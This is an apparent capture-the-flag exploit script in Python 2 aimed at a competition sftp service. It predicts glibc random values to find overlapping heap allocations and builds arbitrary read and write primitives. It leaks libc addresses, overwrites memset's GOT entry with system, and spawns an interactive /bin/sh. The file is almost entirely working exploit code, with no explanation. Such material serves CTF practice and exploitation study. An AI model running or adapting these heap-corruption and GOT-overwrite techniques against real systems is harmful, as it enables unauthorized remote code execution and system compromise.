import time
import socket
import struct
import sys
import telnetlib
import random
import string

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

def pad(buf, size, char):
	return buf + char*(size - len(buf))

# glibc_prng coded by qbx2
# referred to http://www.mscs.dal.ca/~selinger/random/

def glibc_prng(seed):
	int32 = lambda x: x&0xffffffff-0x100000000 if x&0xffffffff>0x7fffffff else x&0xffffffff
	int64 = lambda x: x&0xffffffffffffffff-0x10000000000000000 if x&0xffffffffffffffff>0x7fffffffffffffff else x&0xffffffffffffffff

	r = [0] * 344
	r[0] = seed

	for i in range(1, 31):
		r[i] = int32(int64(16807 * r[i-1]) % 0x7fffffff)
		
		if r[i] < 0:
			r[i] = int32(r[i] + 0x7fffffff)


	for i in range(31, 34):
		r[i] = int32(r[i-31])

	for i in range(34, 344):
		r[i] = int32(r[i-31] + r[i-3])

	i = 344 - 1

	while True:
		i += 1
		r.append(int32(r[i-31] + r[i-3]))
		yield int32((r[i]&0xffffffff) >> 1)

generated_numbers = []

prng = glibc_prng(int(time.time()))
s = tcp_connect("sftp.ctfcompetition.com", 1337)

for i in range(9000):
	generated_numbers.append(((prng.next() & 0x1fffffff) | 0x40000000))

file_entries = generated_numbers[6:][::2]
data_blocks = generated_numbers[7:][::2]

def find_overwrite():
	for i in range(len(file_entries)):
		for j in range(len(data_blocks)):
			if file_entries[i] >= data_blocks[j] and file_entries[i] <= data_blocks[j]+0xfff0:
				return [j, i]

data_block_we_overwrite_with_idx = find_overwrite()[0]
file_entry_we_overwrite_idx = find_overwrite()[1]
offset_to_file_entry = file_entries[file_entry_we_overwrite_idx] - data_blocks[data_block_we_overwrite_with_idx]
c01db33f_directory_entry = generated_numbers[0]

print str(data_block_we_overwrite_with_idx+1) + "th data block overwrites " + str(file_entry_we_overwrite_idx+1) + "th file entry"
print "offset to file entry: " + str(offset_to_file_entry)
print "/home/c01db33f directory address: " + hex(c01db33f_directory_entry)

recv_until(s, "Are you sure you want to continue connecting (yes/no)? ")
s.send("yes")
s.send("\x78\x01\x01\x01\x03\n")

for i in range(data_block_we_overwrite_with_idx):
	s.send("put " + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(6)) + "\n")
	s.send("1\n")
	s.send("\n")

recv_until(s, "sftp> "*data_block_we_overwrite_with_idx)
print hex(data_blocks[data_block_we_overwrite_with_idx])
print hex(file_entries[file_entry_we_overwrite_idx])

def read_address(addr):
	overwrite_payload = "A"*offset_to_file_entry + struct.pack("Q", c01db33f_directory_entry) + "\x02\x00\x00\x00" + "pwn" + "\x00"*17 + "\x08" + "\x00"*7 + struct.pack("Q", addr)
	s.send("put overwrite\n")
	s.send(str(len(overwrite_payload)) + "\n")
	s.send(overwrite_payload + "\n")
	s.send("get pwn\n")
	recv_until(s, "8\n")
	return recv_until(s, "sftp> ").replace("sftp> ", "")

def write_address(addr, data):
	overwrite_payload = "A"*offset_to_file_entry + struct.pack("Q", c01db33f_directory_entry) + "\x02\x00\x00\x00" + "pwn" + "\x00"*17 + chr(len(data)) + "\x00"*7 + struct.pack("Q", addr)
	s.send("put overwrite\n")
	s.send(str(len(overwrite_payload)) + "\n")
	s.send(overwrite_payload + "\n")
	s.send("put pwn\n")
	s.send(str(len(data)) + "\n")
	s.send(data + "\n")

raw_input("press enter to continue...")
print 1
stdout_location = struct.unpack("Q", pad(read_address(c01db33f_directory_entry), 8, "\x00"))[0]-0x40
stdout = struct.unpack("Q", pad(read_address(stdout_location), 8, "\x00"))[0]
libc = stdout-0x3c5620
libc_system = libc + 0x45390
memset_got = stdout_location - 0x3b40
print hex(libc_system)
print hex(memset_got)
print 1

write_address(memset_got, struct.pack("Q", libc_system))
s.send("put 1337\n")
s.send("7\n")
s.send("/bin/sh")
s.send("put 1337\n")
s.send("1\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
